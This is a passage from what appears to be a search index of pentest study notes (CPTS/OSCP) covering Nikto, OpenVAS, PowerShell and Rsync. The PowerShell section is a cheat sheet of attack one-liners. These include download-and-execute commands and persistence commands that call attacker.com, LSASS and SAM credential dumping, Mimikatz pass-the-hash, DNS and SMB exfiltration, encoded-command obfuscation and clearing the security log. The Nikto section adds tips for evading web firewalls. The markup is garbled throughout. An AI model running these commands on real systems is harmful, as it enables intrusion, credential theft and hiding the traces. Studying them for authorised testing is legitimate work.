Command","text":"<ul> <li> <p>Scan a single target:</p> <p>```bash nikto -h  <pre><code>    Example:\n\n    ```bash\nnikto -h http://example.com\n</code></pre> <p>This performs a default scan, identifying common vulnerabilities, configuration issues, and outdated software.</p>"},{"location":"CPTS/Tools/Nikto/#2-intermediate-usage","title":"2. Intermediate Usage","text":""},{"location":"CPTS/Tools/Nikto/#customizing-scans","title":"Customizing Scans","text":"<ul> <li> <p>Specify Ports:     Target a specific port (default is 80 for HTTP).     <code>bash     nikto -h &lt;target&gt; -p &lt;port&gt;</code></p> <p>Example:</p> <p>```bash nikto -h http://example.com -p 8080 <pre><code>- **SSL Scans**:  \n    Force SSL/TLS for HTTPS sites.\n    ```bash\nnikto -h &lt;target&gt; -ssl\n</code></pre></p> </li> <li> <p>Use Host Headers:     Test specific subdomains on shared hosts.     ```bash nikto -h  -vhost  <pre><code>#### **Saving Output**\n\n- Save scan results to a file:\n\n    ```bash\nnikto -h &lt;target&gt; -o &lt;filename&gt; -Format &lt;format&gt;\n</code></pre> <p>Supported formats: html, csv, txt, xml Example: ```bash nikto -h http://example.com -o report.html -Format html <pre><code>#### **Timeouts and Delay**\n\n- Set timeouts and delays to avoid detection or rate limits:\n\n    ```bash\nnikto -h &lt;target&gt; -timeout &lt;seconds&gt; -Tuning &lt;options&gt;\n</code></pre></p> <p>Example:</p> <p>```bash nikto -h http://example.com -timeout 10 <pre><code>---\n\n### **3. Advanced Techniques**\n\n#### **Tuning Options**\n\nTuning allows targeting specific types of vulnerabilities:\n\n- **0**: File Uploads\n- **1**: Interesting Files / Directories\n- **2**: Misconfiguration / Default Files\n- **3**: Information Disclosure\n- **4**: Injection (XSS, SQL, etc.)\n- **5**: Remote File Retrieval\n- **6**: Denial of Service\n- **7**: Remote Source Inclusion\n- **8**: Command Execution / Remote Shell\n- **9**: Authentication Bypass\n\nExample (scan for injection vulnerabilities only):\n\n```bash\nnikto -h &lt;target&gt; -Tuning 4\n</code></pre></p>"},{"location":"CPTS/Tools/Nikto/#using-plugins","title":"Using Plugins","text":"<p>Leverage Nikto plugins for extended functionality:</p> <ul> <li> <p>List available plugins:</p> <p>```bash nikto -list-plugins <pre><code>- Use a specific plugin:\n\n    ```bash\nnikto -h &lt;target&gt; -plugin &lt;plugin_name&gt;\n</code></pre></p> </li> </ul>"},{"location":"CPTS/Tools/Nikto/#scan-behind-a-proxy","title":"Scan Behind a Proxy","text":"<p>If you want to route traffic through a proxy:</p> <pre><code>nikto -h &lt;target&gt; -useproxy &lt;proxy_address:port&gt;\n</code></pre> <p>Example:</p> <pre><code>nikto -h http://example.com -useproxy 127.0.0.1:8080\n</code></pre>"},{"location":"CPTS/Tools/Nikto/#bypassing-wafids","title":"Bypassing WAF/IDS","text":"<ul> <li> <p>Use custom headers to obfuscate requests:</p> <p>```bash nikto -h  -headers \"X-Custom-Header: Value\" <pre><code>- Use randomized user-agent strings:\n    ```bash\nnikto -h &lt;target&gt; -useragent &lt;user-agent-string&gt;\n</code></pre>"},{"location":"CPTS/Tools/Nikto/#4-tips-and-tricks","title":"4. Tips and Tricks","text":"<ol> <li> <p>Combine with Other Tools:     Use Nikto alongside tools like Burp Suite, Nmap, or Metasploit for a comprehensive security assessment.</p> <ul> <li> <p>Example: Nmap + Nikto:</p> <p>```bash nmap -p 80,443 --script=http-enum  nikto -h  <pre><code>2. **Scan Specific Paths**:  \n    Focus on specific directories or endpoints:\n\n    ```bash\nnikto -h &lt;target&gt; -file &lt;file_with_paths&gt;\n</code></pre> <p>Example file:</p> <p>```bash /admin /backup <pre><code>3. **Update Nikto Regularly**:  \n    Keep Nikto's vulnerability database up to date:\n    ```bash\nnikto -update\n</code></pre></p> <li> <p>Use Rate Limiting:     Avoid triggering rate-limiting mechanisms:</p> <p>```bash nikto -h  -delay  <pre><code>5. **Combine SSL and Host Headers**:  \n    Test HTTPS subdomains:\n\n    ```bash\nnikto -h &lt;IP&gt; -vhost &lt;subdomain.example.com&gt; -ssl\n</code></pre>"},{"location":"CPTS/Tools/Nikto/#5-interpreting-results","title":"5. Interpreting Results","text":"<ul> <li>Nikto provides a detailed report highlighting:<ul> <li>Vulnerabilities (e.g., outdated software, weak configurations).</li> <li>Paths of interest (e.g., <code>/admin</code>, <code>/backup</code>).</li> <li>Potential exploits and their impact.</li> </ul> </li> <li>Always validate findings using other tools or manual methods.</li> </ul> <p>With these commands, tips, and techniques, you can utilize Nikto for beginner-friendly scans or sophisticated penetration testing workflows. Let me know if you'd like more details or examples!</p>"},{"location":"CPTS/Tools/OpenVAS/","title":"OpenVAS","text":"<p>OpenVAS (Open Vulnerability Assessment System) is a powerful open-source vulnerability scanner and management tool. It is widely used for vulnerability assessments and penetration testing. This guide covers everything from installation to advanced usage of OpenVAS in penetration testing.</p>"},{"location":"CPTS/Tools/OpenVAS/#1-introduction-to-openvas","title":"1. Introduction to OpenVAS","text":"<p>OpenVAS is part of the Greenbone Vulnerability Management (GVM) framework. It provides tools for scanning and identifying vulnerabilities in systems, networks, and web applications.</p>"},{"location":"CPTS/Tools/OpenVAS/#key-features","title":"Key Features:","text":"<ul> <li> <p>Comprehensive vulnerability scanning</p> </li> <li> <p>Regularly updated vulnerability database</p> </li> <li> <p>Integration with other tools for advanced penetration testing</p> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#2-installation","title":"2. Installation","text":""},{"location":"CPTS/Tools/OpenVAS/#prerequisites","title":"Prerequisites:","text":"<ul> <li> <p>Linux distribution (e.g., Ubuntu, Debian, or Kali Linux)</p> </li> <li> <p>Minimum 2 CPU cores and 4GB RAM (recommended)</p> </li> <li> <p>Root or sudo access</p> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#step-by-step-installation-on-ubuntudebian","title":"Step-by-Step Installation on Ubuntu/Debian:","text":"<ol> <li> <p>Update the System:</p> <pre><code>sudo apt update &amp;&amp; sudo apt upgrade -y\n</code></pre> </li> <li> <p>Add OpenVAS Repository (if not pre-installed):</p> <pre><code>sudo apt install -y software-properties-common\nsudo add-apt-repository ppa:mrazavi/openvas\nsudo apt update\n</code></pre> </li> <li> <p>Install OpenVAS:</p> <pre><code>sudo apt install -y openvas\n</code></pre> </li> <li> <p>Setup OpenVAS:</p> <pre><code>sudo gvm-setup\n</code></pre> <p>The setup process may take some time as it updates the vulnerability database.</p> </li> <li> <p>Start OpenVAS Services:</p> <pre><code>sudo gvm-start\n</code></pre> </li> <li> <p>Access the Web Interface:</p> <ul> <li> <p>Open your browser and navigate to <code>https://&lt;your-ip&gt;:9392</code>.</p> </li> <li> <p>Use the default credentials (admin/admin) or those generated during setup.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/OpenVAS/#common-troubleshooting","title":"Common Troubleshooting:","text":"<ul> <li> <p>Check logs for issues:</p> <pre><code>sudo journalctl -u gvmd\nsudo journalctl -u ospd-openvas\n</code></pre> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#3-basic-usage","title":"3. Basic Usage","text":""},{"location":"CPTS/Tools/OpenVAS/#31-navigating-the-web-interface","title":"3.1 Navigating the Web Interface:","text":"<ul> <li> <p>Dashboard: Overview of scans, tasks, and vulnerabilities.</p> </li> <li> <p>Tasks: Manage and schedule vulnerability scans.</p> </li> <li> <p>Reports: View detailed scan results.</p> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#32-performing-a-basic-scan","title":"3.2 Performing a Basic Scan:","text":"<ol> <li> <p>Go to the Scans tab and select Tasks.</p> </li> <li> <p>Click New Task and configure the target IP or range.</p> </li> <li> <p>Select a scan profile (e.g., Full and Fast).</p> </li> <li> <p>Start the scan and monitor its progress in real-time.</p> </li> </ol>"},{"location":"CPTS/Tools/OpenVAS/#33-interpreting-scan-results","title":"3.3 Interpreting Scan Results:","text":"<ul> <li> <p>Critical: High-risk vulnerabilities requiring immediate attention.</p> </li> <li> <p>High: Exploitable vulnerabilities with significant risk.</p> </li> <li> <p>Medium/Low: Lesser impact but should still be addressed.</p> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#4-advanced-configuration","title":"4. Advanced Configuration","text":""},{"location":"CPTS/Tools/OpenVAS/#41-creating-custom-scan-configurations","title":"4.1 Creating Custom Scan Configurations:","text":"<ul> <li> <p>Navigate to Configuration &gt; Scan Configs.</p> </li> <li> <p>Clone an existing scan profile and modify settings, such as:</p> <ul> <li> <p>Specific ports or services to scan</p> </li> <li> <p>Enabling/disabling certain NVTs (Network Vulnerability Tests)</p> </li> </ul> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#42-managing-targets","title":"4.2 Managing Targets:","text":"<ul> <li> <p>Go to Configuration &gt; Targets.</p> </li> <li> <p>Add multiple IP ranges, exclude certain hosts, or define custom settings like credentials for authenticated scans.</p> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#43-credentialed-scanning","title":"4.3 Credentialed Scanning:","text":"<ul> <li> <p>Provides deeper insights by authenticating into systems.</p> </li> <li> <p>Add credentials under Configuration &gt; Credentials.</p> <ul> <li> <p>Types: SSH, SMB, or web application credentials.</p> </li> <li> <p>Assign them to specific targets.</p> </li> </ul> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#5-integration-with-other-tools","title":"5. Integration with Other Tools","text":""},{"location":"CPTS/Tools/OpenVAS/#51-exporting-scan-results","title":"5.1 Exporting Scan Results:","text":"<ul> <li>Export reports in formats like XML, PDF, or CSV for further analysis.</li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#52-integration-with-metasploit","title":"5.2 Integration with Metasploit:","text":"<ul> <li> <p>Export vulnerabilities from OpenVAS.</p> </li> <li> <p>Import them into Metasploit for targeted exploitation:</p> <pre><code>msfconsole\ndb_import /path/to/openvas_report.xml\n</code></pre> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#53-automation-with-scripts","title":"5.3 Automation with Scripts:","text":"<p>Use Python scripts and the <code>gvm-tools</code> package to automate tasks like:</p> <ul> <li> <p>Scheduling scans</p> </li> <li> <p>Fetching reports</p> </li> </ul> <p>Install <code>gvm-tools</code>:</p> <pre><code>pip install gvm-tools\n</code></pre> <p>Example Script:</p> <pre><code>from gvm.connections import TLSConnection\nfrom gvm.protocols.gmp import Gmp\n\nwith TLSConnection(hostname='localhost') as connection:\n    with Gmp(connection) as gmp:\n        gmp.authenticate(username='admin', password='password')\n        tasks = gmp.get_tasks()\n        print(tasks)\n</code></pre>"},{"location":"CPTS/Tools/OpenVAS/#6-advanced-penetration-testing-with-openvas","title":"6. Advanced Penetration Testing with OpenVAS","text":""},{"location":"CPTS/Tools/OpenVAS/#61-exploiting-identified-vulnerabilities","title":"6.1 Exploiting Identified Vulnerabilities:","text":"<ol> <li> <p>Use OpenVAS reports to identify critical vulnerabilities.</p> </li> <li> <p>Verify findings manually or with tools like:</p> <ul> <li> <p>Metasploit</p> </li> <li> <p>Burp Suite</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/OpenVAS/#62-testing-web-applications","title":"6.2 Testing Web Applications:","text":"<ul> <li> <p>Use OpenVAS for reconnaissance and combine it with:</p> <ul> <li> <p>OWASP ZAP for dynamic analysis.</p> </li> <li> <p>Nikto for web server testing.</p> </li> </ul> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#63-network-penetration-testing","title":"6.3 Network Penetration Testing:","text":"<ul> <li> <p>Perform network mapping and identify open ports using OpenVAS.</p> </li> <li> <p>Use tools like Nmap to validate findings and explore further.</p> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#7-best-practices","title":"7. Best Practices","text":""},{"location":"CPTS/Tools/OpenVAS/#71-regular-updates","title":"7.1 Regular Updates:","text":"<ul> <li> <p>Update the vulnerability database frequently:</p> <pre><code>sudo greenbone-feed-sync\n</code></pre> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#72-fine-tune-scan-configurations","title":"7.2 Fine-tune Scan Configurations:","text":"<ul> <li> <p>Avoid overloading the network by scheduling scans during non-peak hours.</p> </li> <li> <p>Test scan configurations in a lab environment before deploying.</p> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#73-validate-results","title":"7.3 Validate Results:","text":"<ul> <li>Not all reported vulnerabilities are exploitable. Validate them with manual testing or secondary tools.</li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#74-compliance-and-reporting","title":"7.4 Compliance and Reporting:","text":"<ul> <li>Use OpenVAS reports to demonstrate compliance with standards like PCI DSS, HIPAA, or ISO 27001.</li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#reporting","title":"Reporting","text":"<ul> <li>The following will generate the report in the excel file <pre><code>python3 -m openvasreporting -i report-downloaded-from-openvas.xml -f xlsx\n</code></pre> </li> </ul>"},{"location":"CPTS/Tools/OpenVAS/#8-conclusion","title":"8. Conclusion","text":"<p>OpenVAS is a versatile tool for vulnerability assessment and penetration testing. By combining it with manual techniques and other tools, you can significantly enhance your security testing capabilities. With regular updates and fine-tuned configurations, OpenVAS can serve as a cornerstone for any security professional\u2019s toolkit.</p>"},{"location":"CPTS/Tools/Powershell/","title":"Powershell","text":""},{"location":"CPTS/Tools/Powershell/#basic-powershell-commands-aliases","title":"Basic PowerShell Commands &amp; Aliases","text":""},{"location":"CPTS/Tools/Powershell/#system-information-gathering","title":"System Information Gathering","text":"<pre><code>whoami                      # Current user\nwhoami /priv                # View privileges of current user\nGet-ComputerInfo            # Get detailed system information\nsysteminfo                  # List OS and patch information\nhostname                    # Get computer name\nipconfig /all               # Get network adapter configuration\nnet user                    # List local users\nnet localgroup Administrators # Show local admins\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#aliases-for-basic-commands","title":"Aliases for Basic Commands","text":"<pre><code>ls -&gt; Get-ChildItem         # List files and directories\ndir -&gt; Get-ChildItem        # Alternative listing files\npwd -&gt; Get-Location         # Show current directory\ncd -&gt; Set-Location          # Change directory\necho -&gt; Write-Output        # Print to console\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#intermediate-powershell-for-penetration-testing","title":"Intermediate PowerShell for Penetration Testing","text":""},{"location":"CPTS/Tools/Powershell/#network-enumeration","title":"Network Enumeration","text":"<pre><code>Get-NetIPConfiguration      # Show IP configuration\nTest-NetConnection -ComputerName google.com -Port 443 # Check if a port is open\nGet-NetTCPConnection        # Show active network connections\nGet-NetFirewallRule         # List firewall rules\nGet-NetAdapter              # Show network adapters\narp -a                      # Show ARP table\nroute print                 # Show routing table\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#user-group-enumeration","title":"User &amp; Group Enumeration","text":"<pre><code>Get-LocalUser               # List local users\nGet-LocalGroupMember Administrators  # List members of Admin group\nGet-WmiObject Win32_UserAccount | Select Name, SID # List users with SIDs\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#privilege-escalation-enumeration","title":"Privilege Escalation Enumeration","text":"<pre><code>whoami /groups              # Show group memberships\nwhoami /priv                # Show user privileges\nGet-Process | Where-Object {$_.Path -like \"*System32*\"} # Check processes running as SYSTEM\nGet-Service | Where-Object {$_.StartName -eq \"LocalSystem\"} # Show services running as SYSTEM\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#advanced-powershell-for-red-teaming-oscp","title":"Advanced PowerShell for Red Teaming &amp; OSCP","text":""},{"location":"CPTS/Tools/Powershell/#file-download-execution","title":"File Download &amp; Execution","text":"<pre><code>Invoke-WebRequest -Uri \"http://attacker.com/malware.exe\" -OutFile \"C:\\Users\\Public\\malware.exe\"\nStart-Process \"C:\\Users\\Public\\malware.exe\"\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#credential-dumping","title":"Credential Dumping","text":"<pre><code>(Get-ItemProperty -Path \"HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\").V # Dump SAM hashes (requires SYSTEM)\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#persistence-techniques","title":"Persistence Techniques","text":"<pre><code>New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\" | Register-ScheduledTask -TaskName \"Persistence\"\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#lateral-movement","title":"Lateral Movement","text":"<p>powershell</p> <p>CopyEdit</p> <pre><code>Invoke-Command -ComputerName \"VictimPC\" -ScriptBlock {whoami} -Credential (Get-Credential) # Remote Execution\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#powershell-exploitation-tools","title":"PowerShell Exploitation Tools","text":"<ul> <li>PowerView \u2013 AD enumeration</li> <li>PowerUp \u2013 Privilege escalation</li> <li>Invoke-Mimikatz \u2013 Credential dumping</li> <li>Nishang \u2013 Post-exploitation framework</li> </ul>"},{"location":"CPTS/Tools/Powershell/#initial-access-execution","title":"\ud83d\udd25 Initial Access &amp; Execution","text":""},{"location":"CPTS/Tools/Powershell/#bypassing-execution-policy","title":"Bypassing Execution Policy","text":"<pre><code>Set-ExecutionPolicy Unrestricted -Force    # Allow all scripts to run powershell -ep bypass                      # Bypass execution policy temporarily\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#download-execute-payloads","title":"Download &amp; Execute Payloads","text":"<pre><code>IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1') (New-Object System.Net.WebClient).DownloadFile(\"http://attacker.com/nc.exe\", \"$env:TEMP\\nc.exe\") Start-Process \"$env:TEMP\\nc.exe\"\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#memory-injection","title":"Memory Injection","text":"<pre><code>[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"BASE64_PAYLOAD\"))\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#enumeration","title":"\ud83d\udce1 Enumeration","text":""},{"location":"CPTS/Tools/Powershell/#system-info","title":"System Info","text":"<p>powershell</p> <p>CopyEdit</p> <pre><code>Get-ComputerInfo\n(Get-WMIObjectWin32_OperatingSystem).Caption\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#user-privileges","title":"User &amp; Privileges","text":"<pre><code>whoami /priv\nnet localgroup Administrators\nGet-LocalGroupMember Administrators\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#network","title":"Network","text":"<pre><code>ipconfig /all\nGet-NetTCPConnection | Where-Object { $_.State -eq \"Listen\" }\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#active-directory","title":"Active Directory","text":""},{"location":"CPTS/Tools/Powershell/#get-aduser-filter-property-select-name-samaccountname-get-adcomputer-filter-select-name-operatingsystem","title":"<pre><code>Get-ADUser -Filter * -Property * | Select Name, SamAccountName\nGet-ADComputer -Filter * | Select Name, OperatingSystem\n</code></pre>","text":""},{"location":"CPTS/Tools/Powershell/#privilege-escalation","title":"\ud83d\ude80 Privilege Escalation","text":""},{"location":"CPTS/Tools/Powershell/#find-weak-service-permissions","title":"Find Weak Service Permissions","text":"<pre><code>Get-WMIObject Win32_Service | Where-Object {$_.StartName -eq \"LocalSystem\"}\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#token-impersonation","title":"Token Impersonation","text":"<pre><code>Invoke-TokenManipulation -EnablePriv\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#check-for-unquoted-service-paths","title":"Check for Unquoted Service Paths","text":"<p>powershell</p> <p>CopyEdit</p> <pre><code>Get-WMIObject Win32_Service | Select-String -Pattern '\"C:\\\\Program Files\\\\' | Select PathName\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#check-for-alwaysinstallelevated","title":"Check for AlwaysInstallElevated","text":""},{"location":"CPTS/Tools/Powershell/#reg-query-hklmsoftwarepoliciesmicrosoftwindowsinstaller-v-alwaysinstallelevated","title":"<pre><code>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`\n</code></pre>","text":""},{"location":"CPTS/Tools/Powershell/#credential-dumping_1","title":"\ud83d\udd11 Credential Dumping","text":""},{"location":"CPTS/Tools/Powershell/#lsass-dump-requires-admin","title":"LSASS Dump (Requires Admin)","text":"<pre><code>rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#dump-credentials-from-registry","title":"Dump Credentials from Registry","text":"<pre><code>reg save HKLM\\SAM C:\\temp\\SAM reg save HKLM\\SYSTEM C:\\temp\\SYSTEM\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#mimikatz-via-powershell","title":"Mimikatz via PowerShell","text":"<pre><code>IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1') Invoke-Mimikatz -Command \"privilege::debug sekurlsa::logonpasswords\"\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#persistence","title":"\ud83d\udee0\ufe0f Persistence","text":""},{"location":"CPTS/Tools/Powershell/#scheduled-tasks","title":"Scheduled Tasks","text":"<pre><code>schtasks /create /sc onlogon /tn \"Updater\" /tr \"powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#registry-run-key","title":"Registry Run Key","text":"<pre><code>Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Updater\" -Value \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\temp\\script.ps1\"\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#wmi-event-subscription","title":"WMI Event Subscription","text":"<pre><code>$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name=\"Persistence\"; QueryLanguage=\"WQL\"; Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'\"}\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#lateral-movement_1","title":"\ud83c\udfaf Lateral Movement","text":""},{"location":"CPTS/Tools/Powershell/#psexec","title":"PSExec","text":"<pre><code>Invoke-Command -ComputerName \"VictimPC\" -ScriptBlock {whoami} -Credential (Get-Credential)\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#pass-the-hash","title":"Pass-the-Hash","text":"<pre><code>Invoke-Mimikatz -Command '\"sekurlsa::pth /user:Administrator /domain:TARGET /ntlm:HASH /run:powershell.exe\"'\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#winrm-if-enabled","title":"WinRM (If Enabled)","text":"<pre><code>Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#data-exfiltration","title":"\ud83d\udce4 Data Exfiltration","text":""},{"location":"CPTS/Tools/Powershell/#copy-files-over-smb","title":"Copy Files Over SMB","text":"<pre><code>Copy-Item \"C:\\SensitiveData.txt\" \"\\\\attacker\\share\\SensitiveData.txt\"\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#encode-exfiltrate-data","title":"Encode &amp; Exfiltrate Data","text":"<pre><code>[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"C:\\SensitiveData.txt\"))\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#dns-based-exfiltration","title":"DNS-Based Exfiltration","text":"<pre><code>nslookup $(Get-Content C:\\SensitiveData.txt | Out-String) attacker.com\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#obfuscation-evasion","title":"\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Obfuscation &amp; Evasion","text":""},{"location":"CPTS/Tools/Powershell/#string-obfuscation","title":"String Obfuscation","text":"<pre><code>$cmd = \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\" $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd)) powershell.exe -EncodedCommand $enc\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#hiding-powershell-execution","title":"Hiding PowerShell Execution","text":"<pre><code>powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File script.ps1\n</code></pre>"},{"location":"CPTS/Tools/Powershell/#disable-security-logging","title":"Disable Security Logging","text":"<p><code>wevtutil cl Security</code></p>"},{"location":"CPTS/Tools/Powershell/#tools-to-use","title":"\ud83d\ude80 Tools to Use","text":"<ul> <li>PowerView (Active Directory Recon)</li> <li>PowerUp (Privilege Escalation)</li> <li>Invoke-Mimikatz (Credential Dumping)</li> <li>Nishang (Post-Exploitation)</li> <li>Empire (PowerShell C2 Framework)</li> <li>PSExec (Lateral Movement)</li> </ul>"},{"location":"CPTS/Tools/Rsync/","title":"Rsync","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/Rsync/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Tools/Rsync/#rsync","title":"Rsync","text":""},{"location":"CPTS/Tools/Rsync/#overview","title":"Overview","text":"<p>Rsync is a powerful and efficient tool for copying files both locally and remotely. It is widely used for backups, file mirroring, and synchronization due to its ability to minimize network usage through a delta-transfer algorithm.</p>"},{"location":"CPTS/Tools/Rsync/#key-features","title":"Key Features","text":"<ol> <li> <p>Delta-Transfer Algorithm:</p> <ul> <li>Only transmits file differences (deltas) to reduce network load.</li> <li>Compares file size and last modified time to identify changes.</li> <li> <p>Default Port:</p> </li> <li> <p>Operates on port 873 by default.</p> </li> <li>Can be secured by leveraging SSH for encrypted file transfers.</li> <li> <p>Versatility:</p> </li> <li> <p>Can copy files locally or between remote hosts.</p> </li> <li>Supports synchronization of files and directories.</li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Rsync/#security-risks-misconfigurations","title":"Security Risks &amp; Misconfigurations","text":"<ol> <li> <p>Unauthorized Access:</p> <ul> <li>Some Rsync configurations allow listing or retrieving files from a target server without authentication.</li> <li> <p>Credential Reuse:</p> </li> <li> <p>If credentials are discovered during a penetration test, check for re-use on Rsync services.</p> </li> <li>Sensitive files retrieved may help escalate access or pivot within the network.</li> <li> <p>Unsecured Rsync Services:</p> </li> <li> <p>Running Rsync over the default port without SSH exposes it to interception.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/Rsync/#penetration-testing-tips","title":"Penetration Testing Tips","text":"<ul> <li> <p>Identify Rsync Usage:</p> <ul> <li>Protocol 31 indicates Rsync is in use.</li> <li>Use <code>nmap</code> or manual port scanning to detect <code>port 873</code> or Rsync over SSH. <pre><code>nmap -sV -p 873 &lt;ip&gt;\n</code></pre></li> <li> <p>Check Shared Folders:</p> </li> <li> <p>Test if folder contents can be listed or downloaded without authentication.</p> </li> <li>If credentials are required, use previously discovered passwords for access.</li> <li> <p>Explore Sensitive Files:</p> </li> <li> <p>Look for backup files, configuration files, or password hashes.</p> </li> <li>These files might provide additional leverage to access the target system.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/Rsync/#example-commands","title":"Example Commands","text":"<ol> <li> <p>List Contents of a Shared Folder (Unauthenticated):</p> <p>```bash rsync rsync:///shared_folder/ <pre><code>2. **Download Files** (Using Discovered Credentials):\n\n\n    ```bash\nrsync -avz &lt;username&gt;@&lt;target_ip&gt;:&lt;remote_path&gt; &lt;local_path&gt;\n</code></pre> <li> <p>Secure Rsync with SSH:</p> <p>```bash rsync -e ssh  <pre><code>---\n\n### **Key Takeaways**\n\n- Rsync's **delta-transfer algorithm** makes it efficient for file synchronization.\n- Misconfigured Rsync services are a valuable target during penetration tests.\n- Always test for **unauthenticated access** and **password reuse** when encountering Rsync on a system.\n\n**Exam Priority**: Medium  \n**Techniques/Tools**: Rsync, Delta Transfers, Credential Analysis  \n**Tags**: #Rsync #FileTransfers #Pentesting\n\n### **Advanced Rsync Commands**\n\n#### **1. Bandwidth Control**\n\nLimit the transfer rate to avoid overloading the network.\n\nbash\n\nCopy code\n\n`rsync --bwlimit=1000 -avz &lt;source&gt; &lt;destination&gt;`\n\n- **`--bwlimit=1000`**: Limits bandwidth usage to 1000 KB/s.\n\n---\n\n#### **2. Compress Data During Transfer**\n\nSpeeds up transfers for large files by compressing data during transmission.\n\nbash\n\nCopy code\n\n`rsync -az &lt;source&gt; &lt;destination&gt;`\n\n- **`-z`**: Enables compression.\n\n---\n\n#### **3. Preserve Permissions, Ownership, and Timestamps**\n\nMaintain file metadata when copying.\n\nbash\n\nCopy code\n\n`rsync -a --perms --owner --group --times &lt;source&gt; &lt;destination&gt;`\n\n- **`-a`**: Archive mode (preserves most file attributes).\n- **`--perms --owner --group --times`**: Ensures complete metadata preservation.\n\n---\n\n#### **4. Sync Files Excluding Certain Types**\n\nSkip specific files or directories using `--exclude`.\n\nbash\n\nCopy code\n\n`rsync -av --exclude='*.tmp' --exclude='cache/' &lt;source&gt; &lt;destination&gt;`\n\n- **`--exclude='*.tmp'`**: Excludes all `.tmp` files.\n- **`--exclude='cache/'`**: Excludes the `cache` directory.\n\n---\n\n#### **5. Perform Dry Runs**\n\nTest the command without actually transferring files.\n\nbash\n\nCopy code\n\n`rsync -av --dry-run &lt;source&gt; &lt;destination&gt;`\n\n- **`--dry-run`**: Simulates the operation and shows what would be copied.\n\n---\n\n#### **6. Transfer Only New or Changed Files**\n\nUpdate files that are new or have changed since the last sync.\n\nbash\n\nCopy code\n\n`rsync -av --update &lt;source&gt; &lt;destination&gt;`\n\n- **`--update`**: Skips files that are newer on the destination.\n\n---\n\n#### **7. Delete Files on Destination That Are Not in Source**\n\nEnsure the destination mirrors the source exactly by removing extra files.\n\nbash\n\nCopy code\n\n`rsync -av --delete &lt;source&gt; &lt;destination&gt;`\n\n- **`--delete`**: Deletes files from the destination that are not present in the source.\n\n---\n\n#### **8. Use Checksum-Based Comparison**\n\nEnsure integrity by comparing file checksums instead of timestamps and file size.\n\nbash\n\nCopy code\n\n`rsync -ac &lt;source&gt; &lt;destination&gt;`\n\n- **`-c`**: Enables checksum-based 